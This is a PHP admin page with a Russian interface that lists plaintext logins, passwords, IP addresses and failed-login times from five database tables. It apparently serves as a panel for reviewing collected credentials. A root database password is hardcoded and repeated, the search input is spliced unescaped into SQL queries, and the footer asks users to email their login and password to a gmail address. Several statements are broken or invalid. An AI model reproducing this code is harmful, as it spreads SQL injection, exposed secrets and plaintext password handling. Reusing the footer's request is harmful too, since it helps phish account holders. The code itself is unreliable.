<?php
 session_start ();
if (!isset($_SESSION['auth']))
{

exit ("go to <a href='admin111.php'>login page</a>");
}
echo "<a href='adminpanel.php?exit=1'> EXIT </a><br>";
if (isset($_GET['exit']) ==1)

{

unset ($_SESSION['auth']);
session_destroy();
 exit();
}

?>

<html><head>  
<meta http-equiv="Content-type" content="text/html; charset=windows-1251" />

</head><body bgcolor= "#a8d7ff" background= "./img/rD000.gif">
<div class="avtor"><br><br>
<a href="adminpanel.php" class="url-min" title="Наш сайт">Back</a><br><br>

  </div>
<img src="./img/lombard24.png">
<title>Редактирование аккаунтов</title>
<?php
@mysql_connect('localhost:3306 ','root','rFn76#bL3') or die(mysql_error());
	mysql_select_db('host_29723_mirbase') or die('db not selected'); 
mysql_set_charset("utf8");

if(isset($_POST['name'])) 
{
$name = $_POST['name'];
if(mysql_query("INSERT INTO net1,net2,net3,net4,net5 VALUES('','$name')"))
	echo "Successful Insertion!";
else
	echo "Please try again";
}
$res1 = mysql_query("SELECT * FROM net1");
$res2 = mysql_query("SELECT * FROM net2");
$res3 = mysql_query("SELECT * FROM net3");
$res4 = mysql_query("SELECT * FROM net4");
$res5 = mysql_query("SELECT * FROM net5");

?>


<?php
@mysql_connect('localhost:3306 ','root','rFn76#bL3') or die(mysql_error());
	mysql_select_db('host_29723_mirbase') or die('db not selected'); 
mysql_set_charset("utf8");
if(isset($_POST[''])) {

$query = mysql_query("INSERT INTO net1(name,password,ip,ip_del_time) values('$name','$password','$ip','$ip_del_time')") or die (mysql_error());

}

function showIt()
{
	
    $names =  (isset($_REQUEST['searchText']) ?  $_REQUEST['searchText'] : '');
 @mysql_connect('localhost:3306 ','root','rFn76#bL3') or die(mysql_error());
	mysql_select_db('host_29723_mirbase') or die('db not selected'); 
mysql_set_charset("utf8");
	$sql1 = "select * from net1 t where t.password like '%".$names."%'";
		
    // die($sql);
	$res1 = mysql_query($sql1) or die (mysql_error());
	
	if($res1) {
	  while($row = mysql_fetch_array($res1))
	  
	  {
    echo "login: ".$row[0]."<br> password : " .$row[1]."<br> ip-адресс: " .$row[2]."<br> Время неправильных введенных данных: " .$row[3]."<br/><big><a href='pass1.php?edit=$row[name]'>edit</a></big><br/><br/><br/>";	 

	    }
   }	
}
while( $row = mysql_fetch_array($res1))
	

?>
<?php
@mysql_connect('localhost:3306 ','root','rFn76#bL3') or die(mysql_error());
	mysql_select_db('host_29723_mirbase') or die('db not selected'); 
mysql_set_charset("utf8");
if(isset($_POST[''])) {

$query = mysql_query("INSERT INTO net2(name,password,ip,ip_del_time) values('$name','$password','$ip','$ip_del_time')") or die (mysql_error());

}

function showIt1()
{
	
    $names =  (isset($_REQUEST['searchText']) ?  $_REQUEST['searchText'] : '');
	@mysql_connect('localhost','root','rFn76#bL3');
	mysql_select_db('host_29723_mirbase') or die('db not selected'); 
mysql_set_charset("utf8");
	$sql2 = "select * from net2 t where t.password like '%".$names."%'";
		
    // die($sql);
	$res2 = mysql_query($sql2) or die (mysql_error());
	
	if($res2) {
	  while($row = mysql_fetch_array($res2))
	  
	  {
    echo "login: ".$row[0]."<br> password : " .$row[1]."<br> ip-адресс: " .$row[2]."<br> Время неправильных введенных данных: " .$row[3]."<br/><big><a href='pass2.php?edit=$row[name]'>edit</a></big><br/><br/><br/>";	 

	    }
   }	
}
while( $row = mysql_fetch_array($res2))
	

?>
<?php
@mysql_connect('localhost:3306 ','root','rFn76#bL3') or die(mysql_error());
	mysql_select_db('host_29723_mirbase') or die('db not selected'); 
mysql_set_charset("utf8");
if(isset($_POST[''])) {

$query = mysql_query("INSERT INTO net3(name,password,ip,ip_del_time) values('$name','$password','$ip','$ip_del_time')") or die (mysql_error());

}

function showIt2()
{
	
    $names =  (isset($_REQUEST['searchText']) ?  $_REQUEST['searchText'] : '');
	@mysql_connect('localhost:3306 ','root','rFn76#bL3') or die(mysql_error());
	mysql_select_db('host_29723_mirbase') or die('db not selected'); 
mysql_set_charset("utf8");
	$sql3 = "select * from net3 t where t.password like '%".$names."%'";
		
    // die($sql);
	$res3 = mysql_query($sql3) or die (mysql_error());
	
	if($res3) {
	  while($row = mysql_fetch_array($res3))
	  
	  {
    echo "login: ".$row[0]."<br> password : " .$row[1]."<br> ip-адресс: " .$row[2]."<br> Время неправильных введенных данных: " .$row[3]."<br/><big><a href='pass3.php?edit=$row[name]'>edit</a></big><br/><br/><br/>";	 

	    }
   }	
}
while( $row = mysql_fetch_array($res3))
	

?>
<?php
@mysql_connect('localhost:3306 ','root','rFn76#bL3') or die(mysql_error());
	mysql_select_db('host_29723_mirbase') or die('db not selected'); 
mysql_set_charset("utf8");
if(isset($_POST[''])) {

$query = mysql_query("INSERT INTO net4(name,password,ip,ip_del_time) values('$name','$password','$ip','$ip_del_time')") or die (mysql_error());

}

function showIt3()
{
	
    $names =  (isset($_REQUEST['searchText']) ?  $_REQUEST['searchText'] : '');
 @mysql_connect('localhost:3306 ','root','rFn76#bL3') or die(mysql_error());
	mysql_select_db('host_29723_mirbase') or die('db not selected'); 
mysql_set_charset("utf8");
	$sql4 = "select * from net4 t where t.password like '%".$names."%'";
		
    // die($sql);
	$res4 = mysql_query($sql4) or die (mysql_error());
	
	if($res4) {
	  while($row = mysql_fetch_array($res4))
	  
	  {
    echo "login: ".$row[0]."<br> password : " .$row[1]."<br> ip-адресс: " .$row[2]."<br> Время неправильных введенных данных: " .$row[3]."<br/><big><a href='pass4.php?edit=$row[name]'>edit</a></big><br/><br/><br/>";	 

	    }
   }	
}
while( $row = mysql_fetch_array($res4))
	

?>

<?php
@mysql_connect('localhost:3306 ','root','rFn76#bL3') or die(mysql_error());
	mysql_select_db('host_29723_mirbase') or die('db not selected'); 
mysql_set_charset("utf8");
if(isset($_POST[''])) {

$query = mysql_query("INSERT INTO net5(name,password,ip,ip_del_time) values('$name','$password','$ip','$ip_del_time')") or die (mysql_error());

}

function showIt4()
{
	
    $names =  (isset($_REQUEST['searchText']) ?  $_REQUEST['searchText'] : '');
 @mysql_connect('localhost:3306 ','root','rFn76#bL3') or die(mysql_error());
	mysql_select_db('host_29723_mirbase') or die('db not selected'); 
mysql_set_charset("utf8");
	$sql5 = "select * from net5 t where t.password like '%".$names."%'";
		
    // die($sql);
	$res5 = mysql_query($sql5) or die (mysql_error());
	
	if($res5) {
	  while($row = mysql_fetch_array($res5))
	  
	  {
    echo "login: ".$row[0]."<br> password : " .$row[1]."<br> ip-адресс: " .$row[2]."<br> Время неправильных введенных данных: " .$row[3]."<br/><big><a href='pass5.php?edit=$row[name]'>edit</a></big><br/><br/><br/>";	 

	    }
   }	
}
while( $row = mysql_fetch_array($res5))
	

?>
<form method="post" action="pass.php">

<p>
search <input type="text" name="searchText"  value=""/> <br>
<input type="submit" name="searchBtn" value="Search"/> <br>
</p>

<?php
showIt();
?>
<?php
showIt1();
?>
<?php
showIt2();
?>
	<?php
showIt3();
?>

	<?php
showIt4();
?>
<div class="avtor"><br><br>
<a href="adminpanel.php" class="url-min" title="Наш сайт">Back</a><br><br>

  </div>
Если  вам необходимо отправить сообщение  , то необходимо  отправить письмо с указанием логина и пароли вашего аккаунта на:  mirbek.tukeev@gmail.com
</body>
</html>